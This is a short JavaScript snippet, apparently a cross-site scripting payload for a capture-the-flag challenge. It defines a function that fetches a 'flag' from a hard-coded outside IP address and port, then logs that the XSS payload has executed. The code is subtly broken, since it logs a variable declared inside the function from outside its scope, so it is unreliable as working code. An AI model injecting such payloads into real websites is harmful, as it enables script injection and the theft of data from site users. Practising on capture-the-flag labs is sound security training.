function xssPayload() {
  url="http://165.232.190.5:1900/flag";
  const a= fetch(url)
    .then((response) => {
      return response.json();
    })
}

console.log('XSS payload executed');
console.log(a);
xssPayload();
